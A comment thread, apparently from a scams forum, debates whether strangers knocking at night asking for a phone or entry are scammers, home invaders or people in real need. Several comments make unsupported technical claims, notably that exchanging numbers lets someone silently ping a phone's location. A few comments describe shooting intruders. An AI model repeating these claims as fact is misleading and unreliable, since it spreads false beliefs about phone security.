- Unfortunately, there are cases when this happens and the end goal isn't a scam but an armed robbery. You open the door, and one or two guys suddenly appear as well as they can now can force their way in.

Heartbraking not knowing if you should open the door to help or ask them via Ring, to wait,outside while you call the police to help them. I'd probably do the latter.
- Generally, this is done to gain access to the house for a home invasion or something of that nature. If they were casing the house they likely would have just done it during the day.  Regardless, I wouldn't be letting strangers in my house period - day or night - unless I invited them.
- Maybe. But if someone is going to case the house, I find it hard to believe that they are going to do it in the absolute most suspicious and attention-drawing manner imaginable.
- I'd like to share my story NOT to convince you that she wasnt a scammer but more to "trust your gut" if you see someone in distress..  November 17th 2016, I fled in the middle of the night from my abuser, This particular night he was in an extra bad mood and had just finished taking it out on me until he passed out. 

Intold myself Its now or never, I remember belly crawling to the front door and shaking as I unlocked the front door to run. I was wearing a white tank and underwear no shoes no phone no sense of direction. He lived in the desert in a very very bad part of town (it was about 30 degrees that night) as soon as i opend the door I ran harder than I had ever run in my life, occasionally ducking behind bushes if I saw headlights coming (my plan was to make it to the gas station about 3 miles away and call for help (unfortunately not law enforcement because he worked for the department and I didnt want to risk them taking me back). 

My adrenalin had pushed me out the house but very quickly the cold air and my sore body started to make every step feel like it would be my last..

 I saw someone's light on and figured I'll either die in there or on the streets and I took a chance. 

I thought to myself no way will they let me in. I don't think I would have either to be honest. I was shaking from the cold so bad I could barely create a sentence. I saw they had a ring camera so I started to try and trigger the motion camera so that I could then maybe motion that I just needed a phone. 


No one came out for a moment and I had at that point given up hope and collapsed behind their garbage cans. A few minutes later a man came out and asked if I was OK. I just started crying, his wife came out behind him with a blanket and covered me and told me to come inside. They saved my life. I was able to call my parents who lived 4 hours away to come pick me up.. 


My advice to anyone who might end up in a situation where someone comes to your door asking for help.. Don't open the door, pay attention to THEIR surroundings (maybe a car you dont recognize parked down the street or them making lots of hand movements) idk i just know that for me I didn't ask to be let in their house, I asked for a phone. If I had grabbed some of my stuff I probably would have hid it somewhere before going to ask for help in case something bad happened, my stuff might show up later.  

Looking back, the only thing i needed was to hear my mom's voice. God was truly protecting me that night because if they hadn't come outside to ask if I was OK. I would have most definitely died that night.
- I‚Äôm sorry, but unless you are my child knocking on the door at 2 am, the best you are going to get from me is ‚ÄúI will call 911 for you.‚Äù I couldn‚Äôt pick my neighbors out of a lineup, so while I want to help, I will be helping from the other side of my locked door.
- This is so weird because this happened to me, too, about a year ago.  Super cold night.  She said her boyfriend kicked her out.  She couldn't speak English.  I'm a single woman with broken Spanish at best.  She asked to call her aunt and to come in.  I  gave her an old warm coat, dialed for her, and stuck my phone out on speaker phone while she talked to her aunt in Spanish.  The aunt spoke broken English and tried to persuade me to let her in.  I offered to call the cops and she ran  (edit: she did not run off at that moment - she stayed for well over half an hour); my wording was incorrect).  I told her where the gas station was located so she could wait for aunt there.  I called the cops.  The next day, she and her "boyfriend" brought the coat back.  It was the weirdest thing...
- I‚Äôve had two incidents sort of like this, when I lived in a rough neighborhood. In both cases, the people were so high/drunk they could barely function. I‚Äôm not sure about your situation, but in mine, they appeared to be legitimately confused and seeking help. One lady was so wasted that she didn‚Äôt know where she was or what time of day it was, and she was only in a t shirt and undies. I had both of them stay outside, called 911, gave them water, and the pantsless one got a blanket. I think I did my due diligence for their safety but I was not about to open my door to them.
- Just tell them you‚Äôll call 911 and they can help.  If it‚Äôs legit they‚Äôll wait.   I don‚Äôt open my door
- The best thing to do is never answer the door, unless you are expecting someone you actually know and they plan to come over. There are so many different scams these days that it doesn‚Äôt really pay to trust anyone anymore or give people the benefit of the doubt. I don‚Äôt bother answering my door unless I am expecting someone. I‚Äôve had people ring my bell but I just simply don‚Äôt answer it. I don‚Äôt want to be bothered by scammers, salespeople, or any strangers. If I were you, I recommend just not answering the door unless you are expecting someone and get one of those door cameras so you can film what is going on outside and you can see who it the person is in front of your house before letting them in.
- Tell the neighbors about it so they don‚Äôt get scammed too
- Never invite unwelcomed chaos into your home. 

You can help people without letting them inside or handing them your devices. Give them a place to rest, outside. Call emergency services for them. Don't offer up any of your personal information, take control of the situation, it's your house and your property.
- I had someone do that once but I made her stand outside and left the storm door locked.  And called 911 - with a 20 minute wait.  I am not letting some stranger in at 2am. (actually, time of day doesn't matter).
- The correct answer to any of these scenarios is "wait there, I'll call the police and they will help you" if they stay and talk to the cops, they need help. 
The most likely scenario is they run. 

You might come across people who say if you call the cops, it's dangerous for me to go back home for any reason. You simply say don't worry, you can let the cops know you cannot go back home and need assistance.
- Not everything is a scam, but it doesn't mean that you shouldn't protect yourself. I think you you handled things fairly well, by dialing the number instead of just handing her your phone.¬†


There is a risk that there's people waiting to jump out in the bushes, but that kind of thing is exceptionally rare. If you want to be even more cautious, then offer to relay a message. You don't need to physically approach them.


I think in this case, it was just someone having a flight with her family. I don't think how she introduced herself is that out of the ordinary.
- Or having someone test the back door while you‚Äôre occupied at the front.
- this happened to an elderly friend of mine..same exact thing!
- You‚Äôre nicer than me. Best she‚Äôd get from me is calling the county law to help her out. Strangers don‚Äôt get let in around these parts.
- I refuse to answer the door in the middle of the night. My partner used to work nights so I was home alone. Now he works days and picks up occasional night shifts but I still won‚Äôt answer the door.
- "Sorry, my dogs don't like strangers, you'd be in danger. I'll call 911 and have the police come and help you out, or would you prefer fire or ambulance?"  If they stay, so be it, maybe legit, if they run, call 911 and report them.
- For future reference the better response is " Just hang out there and Ill call the local station to see if they can send someone better equipped to help you "
- I was just thinking of this recently.  What would I do if someone knocked on my door in the middle of the night?   What IS the recommendation?   My inclination is to never open the door and immediately call the police.
- Anybody visiting our property is greeted by Rottweilers and guard roosters. Beware of Guard Rooster signs are clearly posted at the entrance to the three mile long driveway.
- Never open the door. Never open the door. And then when you‚Äôre done not opening the door, g‚Äôhead and never open it again.

Just call 911 and they can make the call.
- Yeah this definitely feels off. I am also tge kind of person who would want to help in this situation so I absolutely understand why it would work. Your description sure has some odd vibes though. Hopefully you actually helped someone but be safe. I sure would be extra cautious for a while just in case.
- In that duffle bag could have been a gun- let her in, she robs you. I wouldn‚Äôt even let her into the entryway. That‚Äôs what the police is for.
- Jesus that‚Äôs scary. I follow @dannah_eve on IG and she gives safety tips. She said if this ever happens, call the police and lock the doors. Talk to them through the door and do not open it. 

If they are *really* in trouble, the police will help. If not, they will scatter. When you open the door, someone else (probably a man) will run in and steal. 

Never open the door to someone you‚Äôre not expecting. Glad you‚Äôre ok and good on you for keeping your wits about you.
- I really hope if I was in a desperate situation and ran to my neighbors, they'd think I was scamming them. That's scary to think about.
- I had my car get stuck in a flash flood.  I took off my shoes because they were expensive and new.  I took my expensive camera, shoes and photography portfolio and then opened the door into 4 feet of water.  I went to the first house to ask to use the phone.  He was a f***ing cop but wouldn‚Äôt help me.  Eventually, a guy in a truck came to see the flooding and gave me a ride to my friend‚Äôs.  Her boyfriend towed my car with his Buick!  And, we are supposed to trust cops?
- While it could have been a scam, it could be that she was calling her cousin's girlfriend or close friend, and just said cousin to simplify. Step-cousin or half brother's cousin might have sounded weird. I have a very complicated family, and could say "I'm calling my brother's second ex-wife," or "Calling my brother in law's stepfather's niece," which I have also done.

It sounds like she might have been escaping a more difficult situation than she wanted to say, for fear it would sound like she was trying to con you. She wouldn't use her phone because if she was being held against her will, she wouldn't want them to track her phone and who she called.

- This sounds like a scam! 

It‚Äôs really weird that she had a bag packed but still couldn‚Äôt tie her hair back and was asking for a phone. ü§î It could‚Äôve been a trick to distract you while she did something shady. 

Always trust your gut! If something doesn‚Äôt feel right, don‚Äôt hesitate to call 911
- I thought it was going to be a distraction with her in the front and someone sneaking in the back.
- There was a scam in the uk where similar events would happen. The woman would claim to be attacked/raped, you‚Äôd invite her in, she‚Äôd used the bathroom and rob you. Leave immediately before police arrived. Can‚Äôt trust anyone
- Best to assume any stranger who knocks on your door is a scam artist and work back from there.
- Girlfriend had to run when wife returned home.
- This is like way beside the point of the whole post but not everyone uses a strongly scented soap.  I use a scentless soap.  Having acrylic nails and toes is no indication of someone's current situation.   Who cares if she has a designer purse?  And based on a 2 minute interaction you couldn't have known if it was a knockoff which are very common.

Just very weird details to include in a post IMO.  

We don't answer the door at our house unless it is someone we know is coming, no matter what their situation looks like.  Call the non-emergency line for you area, report someone in distress knocking on doors and call it a day.
- She could have mental challenges.
- I would have called the cops
- Lol. Or maybe, just maybe‚Ä¶ it‚Äôs a distressed young woman who knocks on the door at night.
- Say, ‚ÄúI‚Äôm calling 911 for you.‚Äù  If they don‚Äôt want you to or protest against it; they‚Äôre stalling for their handler.

Call 911 anyway and report a stranger in distress knocking at your door who didn‚Äôt want me to call 911.  That should get police attention and your response may be shorter.  

If she leaves or stays get as good a description as you can and the direction she went and the time it occurred.  

If she runs to a vehicle, get the make, model, license and description of the driver/occupants if any.  She will stay and receive community services if she is in legit trouble. Recollect her statements to the police.

Emotional problems act out displays should always, always be handled by a professional response.  Females can be quite convincing in their deceits.  Too much criminality has crept into youth and society for good samaritans to risk anything, unless the are obviously in need of direct first aid and working in Oakland they will fake that too.

They just want you in a position of vulnerability where the male who holds their leash can come in and use his muscle and threats to take everything of your he can including your life.  

It‚Äôs not the same America it used to be. You are seen as a means to a transaction by the majority. 

Urban dwellers are far more precautious.
- Doesn't smell like soap?   WTF
- Total scam.  Same thing happened in my old neighborhood.  Once we saw her doing it at other houses we knew we were right to say no.
- ‚ÄúStay there I will call tge police to help you‚Äù
- Sounds like a potential scam. I‚Äôm glad I‚Äôm one of those not great people who pretends they aren‚Äôt home. I even had someone (my grandfather who was a complete pain) yell in ‚ÄúI can see you‚Äù. I‚Äôm old now so at this point I would probably yell back ‚Äúno you don‚Äôt!‚Äù. I would not answer the door that late. Yell a phone number to me and I will call someone for you but you‚Äôre not coming inside.
- They want access to your phone so it can be hacked.
- lol you said slides and acrylic nails. Immediately that should have triggered something. My ghetto senses are tingling. Robbery incomingüòÇ
- Obviously it's a scam. I see people like that in my neighborhood all the time. Half the time it's just guys acting shady or acting overly friendly. The other half of the time it's women that do this too. I see shady people outside at all hours of the day and sometimes at night. I even hear cars speed by all the time. I noticed that sometimes it's the same car. I'm terrified to go out at night. Every time I'm out when it's dark or before it gets dark I walk really fast or sometimes run. It's like when the sun goes down it's the purge or the walking dead when all the crazies come out
- >Had time to pack a bag but not to tie her hair back?) 

Priority

>her parents turned off the wifi so she can't use her phone. (What?)  

Wifi saves data

>She says she's calling her cousin.

>You can hear the dad in the background asking who it is and she says "Michael's sister" (pretty weird way to talk about your cousin). 


I'm not close to my cousins. My oldsr brother is

Thank you for doing a good seed.

- Did she ask for Tamra?
- She may not have a data plan and can only make calls using wifi.
- I find it unlikely that this person, or almost anyone, would have their cousin‚Äôs phone number memorized.
- I don't answer the door past sundown if i don't know the person or let strangers in period.  I'll call the cops for you, and you sit your ass outside.
- This is why ya have big dogs and a big boom stick in view when ya answer the door.
- Am i the only one who doesnt see a scam everywhere.
Sounds like you helped someone out with a phonecall
- In the old days we‚Äôd just let her in and comfort her. Those days are gone.
- Just a young lady who sounds like she might need to do a little self reflection and therapy.¬†


She definitely tried to sell you a story but I'm positive it wasn't in order to case your house. I know these kinds of girls and they usually get by in life "depending on the kindness of strangers" and different kinds of tactics through manipulation and whatever looks they may have left. I hope she gets the help she needs so she doesn't continue to scare and/or worry other people, especially strangers.¬†


I'm glad you actually extended a helping hand, OP, even if it was with the utmost of suspicion lol. Don't think about it again. Sometimes they do come back since they got help from you in the first place, so if that happens, I just wouldn't answer the door next time. She won't be back for a third.
- Why in the actual F are you answering your door?
- Watch movie knock knock ü§™
- Let me see your phone.
- Once they have your phone number on their phone and their number on your phone, they can ping your phone for location without you getting any message or ring. So they can know when you are not home.

This is done to me repeatedly. Left the house the other day, left the phone at home, got a call. Got home, 20 minutes later, got a call. While large white SUV was parked directly under my kitchen window and blocking the garage. The calls are always from Colorado where the insurance fraud racketeer stalker that is stalking my family since 2007 is ~~from~~ living.
- This is a another reason I love the fact I still have a land line lol.
- Unless I know you as a friend, no one else even gets to hold my phone.   Even without the scam angle, I'm not handing over a $1000+ object to a stranger.
- They may also just start making a call, walk off like they need privacy then disappear with your phone.
- Aren‚Äôt banking apps in US not based on fingerprints or face recognition?
- Both of these actions require Face ID / passcode tho
- Jesus Christ that‚Äôs so fucking scary
- I had my back to the window when I read this and even though I live on the 8th floor I still got up and moved. Good lord that‚Äôs scary.
- pants shitted
- My hillbilly great-grandmother used to tell me stories like this üò¨. Crone at the door‚Ä¶oh hell no.

I love *listening* to those old mountain ghost stories, but think I‚Äôd pass out if I found myself reliving one.
- After watching the TV Show "From" I ain't cracking a window or door to any old lady üò±
- I just remembered my neighbor had a guy wake her up by tapping on her window late at night a few years prior only he sat on this planter in front of the window for a while before leaving. She was like 21 and called her dad of all people but the guy was gone by the time he got there. She asked me the next morning when I was leaving for work if I saw anything and I said no. She moved out before the old lady came.
- Sounds like a vampire
- BABA YAGA
- Did you call for medical assistance?
- watch out for the wendigo
- If you‚Äôre outside my house at 5 am tapping the window im coming out with a baseball bat swinging.
Old lady or not
- Had a neighbor with a father that had dementia duff was never a great guy to begin with. He walks in my house and asks me why I am in his house and is yelling at me and my kids that we need to leave his house. I finally pushed him out and he started trying tk break into my door I didn't have my neighbors numbers I finally went around back of the house and showed him where he lived he did this three more times and one day he just wondered off his son and his sons gf were addicts and I have no idea what happened to him after that he basically disappeared way out in the country with miles and miles of woods between houses in some parts
- Moon's haunted. Time to find a new house
- You are not currently living in Fromville, are you?
- Ms. Wakefield?
- Kind of reminds me of those...shit idk what they're called, Mexican witches that "roam the streets at night". The ones you can hear and such but don't look at one or let them see you or whatever. Shit unnerves the hell out of me.
- I think there are multiple horror movies/TV shows like this.
- This is horrifying
- This is dementia
- Oh my god. Keep your gun close by holy shit
- And so you did nothing to help her?
- Exactly what I was thinking
- That's my thought. 

I no longer open the door if you don't have an appointment, and my first response to someone knocking on the door is to make sure one of my handguns is on me.
- I‚Äôve heard one possible way to help if a person says they‚Äôre in danger is to use the fob to unlock the car, if it‚Äôs in the driveway, then call the cops. They can lock themselves in the car to be somewhat safe there. Not sure if it‚Äôs the right thing to do, just thought I‚Äôd share.
- If it's just me, I don't even get up to answer the door. My husband answered and let her in because she was so upset.
- This is r/scams. Every single time that a stranger interacts with you at your home, it's to case your house. It doesn't matter that not a single person who has ever made a post like this has come back and said, "you guys were right, I ended up getting robbed." Nothing bad ever actually seems to happen to the OP of these posts yet this sub remains certain that it's **always** nefarious.
- I disagree. She got inside and got to look at what they have ‚Ä¶. At least from the entryway.
- Don't let nobody, not even a neighbor into your home, have a backup phone and let her use that phone never trust nobody including your family, family members just might be totally jealous of what you and your husband have, family members are just as hungry for something you have just like your friends and neighbors
- Are you doing okay now? That was very brave of you to leave your abuser
- This is unfortunately what had to happen, in today‚Äôs world. If they are really in trouble, they will be happy you are calling 911.
- This sub has me so paranoid. Anyone knocks at night and I'm calling 911 immediately, not even talking to them
- Adding to say I live in a not-expensive neighborhood of tiny houses, so I doubt she thought she was going to find anything good here if that's what she was after.  My iPhone was probably older than her.  The whole thing was so strange.  The police was confused, too.
- > I offered to call the cops and she ran

If she were an undocumented immigrant, that would make sense.

> she and her "boyfriend" brought the coat back

Indicating she possibly had a genuine issue. The fact that scammers use "woman in distress" ruse to pull off nefarious stuff doesn't mean the genuine situations with a woman in distress have stopped happening entirely. 

Good on you for helping her.
- You offered to call the cops for an illegal and wonder why she ran. lol
- For me, if you are a friend or family coming to visit, call or text me. Otherwise, I'm not available. Any time of the day or night.
- Exactly. Even if I kow you don't come over u announced. That is fuckin rude.
- Good call.
- You‚Äôve never heard of the cop-arrests-the-victim scam? It happens ALL the time. The perpetrator could be a cop, or their brother is a cop, or that particular force hates women/POC. 

Cops aren‚Äôt everyone‚Äôs friend.
- You‚Äôre right not everything is a scam but in this day and age it‚Äôs better to treat everything as a scam. 

In a case like this they‚Äôd never get into the house, they‚Äôd never use my phone. Simply ask if they need the police, if so I‚Äôd call them, if not have her leave my property. But never would she get in the house.
- You think your cousin saying to your uncle "it's Michael's sister" and not "it's Maria" is normal?
- But the likely scammers now know the OP's address, **phone number**, what they look and sound like, and probably name, too.  A social media search might provide birth date.  Identity thieves?
- Roosters scare me more than rotties üòÜ
- Always leave your screen door locked -
It‚Äôs a thin barrier between you and the people outside and you‚Äôll know right away what their intentions are‚Ä¶
If someone reaches to try to open the screen door and it‚Äôs locked - you can close the storm door and have time to call 911 for help.  

This happened to me over the summer and I was really glad I had been reminding the kids over and over again to lock the screen door ‚Ä¶ we live in a seasonal resort area and sometimes people not asking for directions, but this time it was difficult mental health situation with a friend of my neighbor that I didn‚Äôt even know‚Ä¶ I was able to get her the help she needed (police and fire department came and took her to hospital for assessment )‚Ä¶everything was OK -but the neighbor ended up getting evicted for her friend‚Äôs ongoing behavior ‚Ä¶and I‚Äôm glad I remembered to lock the screen door.
- Right? It was ‚Äúdidn‚Äôt smell like soap‚Äù for me. üôÑ
- I mean, it‚Äôs not a problem if you actually know your neighbors. Just go over and say hi. Smh
- Do your neighbors not know what you look like? Like not even one neighbor knows your name?? I know it‚Äôs 2025 and ppl are much more private and/or paranoid but damn
- A cop probably has scam signs drilled into their heads. You fit the description so they didn't offer to help, while off duty at their home. I wouldn't have trusted you either.
- Oh yeah. You can trust a cop. It's just that they don't trust you. Cops aren't invincible nor are they immune from predator attacks. You'd like to think that seeing the patrol car in his driveway is an unofficial advertisement that his home is a safe place to run to when you're in trouble but he doesn't sleep with the gun and badge strapped to his body.
- In which case 911 is still the best move.
- In the winter of 2017 my now wife and I picked up a lady that was running down the street barefoot & holding a toddler while screaming for help in a blizzard, sat in the truck until the cops and ambulance showed up, I think she was having a mental break but it was fucking scary. If there wasn't a child involved I would've left her but the little dude's teeth were chattering and I keep a fleece blanket in that truck so they were able to warm up. But yeah sometimes people just need  help.
- Yea this isn‚Äôt as rare as people think. 

I‚Äôve had a neighbor knock on my door for help with a domestic violence situation before. 

Scams are real and dangerous but there are also legit times someone needs help.
- Yea I have been stranded alone needing a phone call twice‚Ä¶ and strangers (women usually) have helped me
- We‚Äôre all such cynics now. I get it, there are really bad folks out there. I‚Äôve got kids so not sure how id deal with this situation. Reality is that this talk of home invasion and all that is I assume so rare but now something happens in New Zealand and blammo, you‚Äôre double and triple checking your locks 8,000 miles away.
- Yeah so you call 911 for them.
- I feel like there was another such story here a few weeks ago.
- Funny you mention emotional problems should be handled by a professional. I'm a therapist. I could hospitalize her if necessary. I came to deescalate the situation if necessary so my husband wasn't out of his depth.
- > She's in a robe, hair towel, and slides. She does not smell like soap.

A person who looks like they came out of the bath or shower probably would‚Äôve had a clean smell, or at least not a bad smell, about them. The implication being they dressed this way to deliberately give a false image.
- What phone does not have cellular access .. wifi is a secondary way to connect to the Internet.  If her parents turned off the wifi, she's still be able to connect via the mobile company .. Verizon or T-Mobile or whatever it is.  You can't turn that off.  The whole turned off the wifi thing is directed at people who don't understand how phones work.  ... Just like any other scam, they use phrases to sound legit.

- With the newer iOS you can require face id for any app
- It‚Äôs something you have to set up. Lots of people don‚Äôt bother
- Yea this sounds just like in the computer game Mortuary Assistant when the demon tries to lure you outside but pretending to be your grandma at the window. 

This kind of shit freaks me out. Maybe it‚Äôs from too many scary things or old tales from Appalachia stories.
- An old woman, likely scared out of her wits with dementia, is scary to you? Dear God. Doesn't anyone have any empathy any more?
- Even scarier if the lady started tapping on your window

- Little known fact: it's a documentary
- How on Earth did he get in the the first place?
- LOL, yes, I was going to comment ‚Äúwatch the very first scene in the first episode of FROM.‚Äù
- The fact that this is heavily downvoted is pretty depressing.

Not everything is a scam, lads.

When something has a possible attack vector but is under 1% likely to be a scam, and somebody is in need of help, and you go with protecting yourself from a very remote possibility instead of helping, I personally think you've gone into tin foil hat paranoia mode and you're not being good people.
- Found the scam victim!
- I bought a cute little sign that reads, ‚ÄúWe don‚Äôt open the door to strangers‚Äù And I‚Äôve made sure nothing on my front property includes the word welcome. The sign seems to have worked, or maybe it‚Äôs just a coincidence, because we‚Äôve had not one salesperson or religious group come to our door since I put it out.
- Always open the door with MR GLOCK
- What a profoundly depressing country you live in...that is insane to read.
- This is the way üôè
- "I can call the cops for you" would probably work.
- That‚Äôs why they use an ‚Äòinnocent‚Äô looking girl in distress. You need to not open your door to people showing up at night. Period. There‚Äôs simply no reason. 

There could have been armed accomplices hiding in your bushes- this is a home invasion ploy. I would have just said ‚Äúthe cops are on their way to help you‚Äù through the door. I bet you anything that if you guys had done that she would have said it was okay and left quickly.

I had a woman who was crying pull this on me years ago in a city- and she shut her crying off in one second- stone faced. Said it was okay, and turned and left. It‚Äôs scary shit.
- The general level of paranoia in this sub is ridiculous
- This story reads like they helped someone in need and they‚Äôre on Reddit convinced that their house got cased. Some sort of true crime brain rot is happening here
- It makes me sad because when I was a stupid teenager I snuck out, and on my way back in my street an unleashed pitbull was giving me fight eyes. I walked over to the nearest house and started knocking for help but no one opened the door for me üò≠ 

I could have been mauled but luckily a neighborhood dog who always barked when I passed by every day had gotten out of her fence too, and started a scuffle with the dog so I could get away. She passed a year later of old age I believe, RIP Roxie. I had initially disliked her for barking at me constantly but she saved me when the neighbors wouldn‚Äôt. ‚ù§Ô∏è‚Äçü©π
- In these times, better safe than sorry. I'll take my chances turning away a stranger compared to herm coming to my family.
- There are a million ways to do this during the day in a manner that draws only limited suspicion. If they were casing the house like this, they win the stupidest criminal of the year award.
- Nah just call the cops and tell her they will help her
- Never let family into your house? What do you do for thanksgiving?
- Your post smells like severe unresolved issues.
- Why even let her use a phone?
- Kind of you to ask. I'm ok. I stuffed it wayyy down and figured I'll let it all spill out when I'm 80 and in some nursing home hahaha
- If that person is in genuine trouble isn't that the right thing to do?
- There is a not small segment of the population who have atrocious communication skills or ability to read social situations. Who very much just live in their own world. Add a language barrier on top and I could see this being simply an inability to read why you would be freaked out, and they in turn freak out and run away when you start talking about calling the cops.
- "undocumented"


Illegal. She's running because she's here illegally.
- Ran is the wrong word.  She was at my door for over half an hour after that.  I was alone with a small child and could not randomly let people in at 10:00 at night.  I had never seen her before in my life and I know most of my neighbors.  She couldn't tell me where she lived.  Most of my neighbors are Spanish-speaking and many are undocumented.  Many of my child's classmates are probably here undocumented.  I doubt the police would have cared on her immigration status.  My options are limited in what I can do.
- Yeah. Same here. I‚Äôm not answering if I don‚Äôt recognize a number or if no phone number shows up. They will have to leave a message if they really know me and want me to respond. When I am about to go to sleep, I have my phone on the ‚Äúdo not disturb‚Äù mode but I have my phone set for certain people to call me if there is an emergency, but the rest will have to wait till I am up for me to get back to them. I certainly won‚Äôt answer the door if I don‚Äôt know who is coming. People have to call me to let me know they want to come over. So I am the same way as you.
- Yeah it is rude for someone to just show up unannounced. Even in the event of an emergency, they could always call first. If someone had to come to my house immediately, they would still need to call. I would have no problem with someone coming over immediately because I understand emergencies happen and they might need my help, but they really should call first. I just don‚Äôt answer my door if I don‚Äôt expect anyone as I live in a city and if someone is knocking my door, it‚Äôs no one I know and I don‚Äôt want to be bothered by strangers and also for my safety. Everyone that knows me knows they need to call first. That‚Äôs how I know if someone is knocking on my door and I‚Äôm not expecting anyone, then I know to simply not answer it.
- I'm not saying they are anyone's friends. I'm saying this is how you protect yourself and your family from a random person knocking on your door in the middle of the night. 

Do you think a random family is in a better position to help someone or actual law enforcement who is trained to help. 

Also not every cop is corrupt or out to get you.
- The only reason I'd think there's still a slight chance it was legitimate is because you never know if she just said "cousin" to be quick without explaining the whole situation. Some people use terms like brother, sister, and even cousin when they aren't technically related to someone. Maybe it's even a situation like, Michael is this person's blood-related cousin on his dad's side, this girl at your door is Michael's sister who has the same mom but a different dad and the parents never married and their family is kind of odd/doesn't 100% include her so while she'd refer to this person as a cousin, their family sometimes wouldn't refer to her as the "cousin," but "Michael's sister." Otherwise though, yeah, that seems off

Idk, kinda just babbling and not really helpful lol, but I'm just saying. Definitely could've been a scam though, so you were right in being cautious either way
- It could be. There may be more than one Maria in that family.
- It could be her uncle-in-law, who she is not very close with, or who you thought was the dad was not the dad at all but someone else. Again, you don't know the dynamics of her extended family, which if she's telling the truth, is pretty messed up.


Nonetheless, if you called a land line, someone picked it up, gave the phone to someone else, who then came to pick her up, the chances that she's casing your house for valuables is extremely low.


You have the number on your phone, and you'd be able to easily identify her in a line up. That's just too much identifying information to hand over if she was up to no good.
- It‚Äôs probably akin to ‚Äòit‚Äôs Michael‚Äôs sister again.‚Äô  This might be a regular thing.  20-year olds have often not yet reached stability and can be difficult, sometimes very difficult. House rules do not always fly well.
- Oh, no!  Not their name, address, and phone number!

Wait until I tell you about phone books.
- Me, too!
- Report it as a thwarted home invasion and you get a faster response.  

I‚Äôve been told by police dispatchers in Oakland they couldn‚Äôt respond to my several thousand dollars worth bike theft for 8 or 9 hours because there several homicides in front of me.
- That‚Äôs what I‚Äôm saying ik it‚Äôs 2025 and everyone is more private/paranoid but come on. I know my downstairs neighbors name, age, car, job, etc. lol I‚Äôve always at least known general details about my neighbors
- His patrol car wasn‚Äôt in the driveway and when he looked towards the creek he saw my car.  This was before cells and I even asked if I could give him a number to call and he refused.  Heck, he could have even called emergency services.
- Exactly, even if it‚Äôs a mental break, people need help sometimes just like the high and mighty on Reddit. Sometimes life doesn‚Äôt go as planned so best not to just shit on everyone and instead have healthy skepticism. I love the comment on this thread, ‚Äúgenerally, they‚Äôre casing the joint for a home invasion.‚Äù  How does he know generally. He doesn‚Äôt. He‚Äôs a pretender. He spreads his cynicism that everything is dangerous, everyone is nefarious. That‚Äôs not how I wanna live. 

PS.  I‚Äôm full of shit. Difference between myself and most on this thread, I know it.
- This is how the Frankes got found out, although it was a minor who knocked on the neighbor's door.
- Did you know the neighbor (at least by sight, even if you hadn‚Äôt spoken)?

I still have the ‚Äúdon‚Äôt talk to strangers‚Äù instinct from being an 80s baby, but I would probably open the door for someone whose face I recognized.
- Why are you so invested in having people let strangers into their homes? Calling 911 is the perfect response to this stuff. Anything else is reckless.
- I understand the implication, it's an odd thing to notice about a stranger in " distress". Like the smell off soap is so overpowering after showering?
- And it was chilly out, so more reason to let her in.
- "you can't turn that off"

Take out the SIM card,  it's off,  don't pay your bill, it's off. 
but it still has Google operating system (not sure about Apple). And can connect to the internet with Wi-Fi at most major establishments like Starbucks / McDonald's, and use many different apps to make phone calls. like WhatsApp or Facebook,

- We live out in the country leaving your keys in your car and your door unlocked is common practice I still leave my house doors unlocked and keys in my trucks but I live down a long dirt path. And at the time I had a screen door so the second time he walked in he just opened it.
- This was a sketchy area, and I was used to weirdos and street people and druggos being in the area. One time I fell asleep on the couch watching a movie with my girlfriend and awoke to some tweaker with his hands pressed up against my window screen (it was summer and hot out) just ogling us through the blinds but he took off once I yelled at him. I'm a pretty big guy but I assure you the old lady thing made my blood run ice cold, it's not like I woke up to a weird thing and was startled, I could feel that there was something deeply wrong about this situation. And it's not like "help me," it's just tap, tap, tap, "let me in" with some whispering. Yes, it's probably a very confused old lady who wandered outside early in the morning but I got incredibly bad vibes from this.

Though to be clear, never actually open the door.

Shout through it but don't actually open it. If it lasts a couple of kicks during a forced entry that's enough time to draw and get a good aim at your problem. You can even stand a few feet back to get extra time to land shots in case they're carrying melee weapons rather than ranged.
- What country are you assuming? Venezuela? South Africa? Mexico? Half of sub-Saharan Africa? Is the idea of violent crime and home invasion specific to one country in your mind?
- My parents live pretty far outside of a smaller town.

Someone waited for my dad to leave once and drove down their long driveway to break down the door while my mother was inside telling them to leave. Only when she said "If you come in, I will shoot" did they leave.

America has a serious crime problem for a police state.
- I'm a happy guy in daily life.

Most people I interact with seem to be in good moods.

I just haven't had a positive interaction with a stranger who knocked on my door since cell phones became a thing, so I stopped answering. I don't want to buy anything from a door to door solicitor, I already know what church I want to go to, and I know who I'm going to vote for.

Unless I'm going somewhere I'm not allowed to do so, I will have a pistol in my hip pocket anyway. It's not like I'm grabbing my shotgun every time someone knocks on the front door.
- "Don't worry, I already called the cops on you... umm, I mean for you" works even better.
- Don't open the door to any stranger who shows up uninvited and unexpected.¬†

They're not showing up to give you a million dollars.
- Ridiculous but in the US, absolutely necessary

Crime is the lowest it's ever been in US history. The media has everyone paranoid because it's great for their ratings. Doubly true for social media. They want you scared so you'll just stay home and stare at a screen. Stay scared! Keep the ad revenue up!!
- Solar panel salesman. They're always going around neighborhoods.
- You‚Äôre trying to put logic to an illogical situation. 

Also, as stupid as criminals are, there are also very desperate and at the point where they‚Äôre willing to do anything to get to what they want. This is exactly the type of scam that people in that type of situation are in will try to do.
- Well, not every criminal is going to be smart tbh.
- Call the cops, duh
- Go to their house of course.
- So people can call her
- Yeah - I edited my original wording.  She left; she didn't run off as soon as I mentioned the police.  She was with me for about another 1/2 hour after I suggested the police.  I talked to her aunt extensively.  I couldn't let her in given that I was alone with a small child.  So many people in my neighborhood are here undocumented that the police would probably have taken her to the station, given her a blanket and coffee and a chance to warm up, and tried to find where she should go.  The aunt wanted to come pick her up but was an hour away.  The police would have let her stay inside till the aunt picked her up.
- Yes, she didn't get the right visa paperwork done. That's a heinous crime, clearly making her a menace to society.
- It's not 1970, grandpa!
- Yeah tbh I can‚Äôt imagine living somewhere without an emergency contact nearby. I exchanged phone numbers with someone in my building the day I moved in. We actually became friends. Also with someone I met later. It has come in handy so many times, not just in emergencies! You don‚Äôt have to know all your neighbors, just 1-2!
- This whole neighborhood has only existed for 3 years, all new construction. I know my immediate neighbors and the ones across the street. I keep up myself.
- Generally they're up to no good because it's 2025 and even your local homeless beggar on the corner has a cell phone.

Running to a neighbor's house for help is vanishingly rare now. This isn't the early 1970s.
- Yep- I almost added that as well but I‚Äôm so EWU-brained that I didn‚Äôt know if ppl would know the reference. 

My least favorite part about scams is that they make us all trust each other a lot less when mostly (in my experience at least) persons can be pretty good.
- I did not actually. 

Actually it was my first night in a new place and the woman knew the neighbor that had lived there before. 

